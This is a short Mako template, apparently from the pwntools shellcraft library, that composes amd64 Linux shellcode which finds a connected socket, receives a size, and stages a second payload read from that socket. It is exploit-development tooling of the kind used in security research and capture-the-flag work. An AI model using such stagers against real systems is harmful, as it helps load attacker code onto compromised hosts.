<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft.amd64 import linux %>
<%docstring>
Findpeer recvsize stager
Args:
    port, the port given to findpeer (defaults to any)
</%docstring>
<%page args="port = None"/>

${linux.findpeer(port)}
${linux.recvsize('rdi', 'rcx')}
${linux.stager('rdi', 'rcx')}
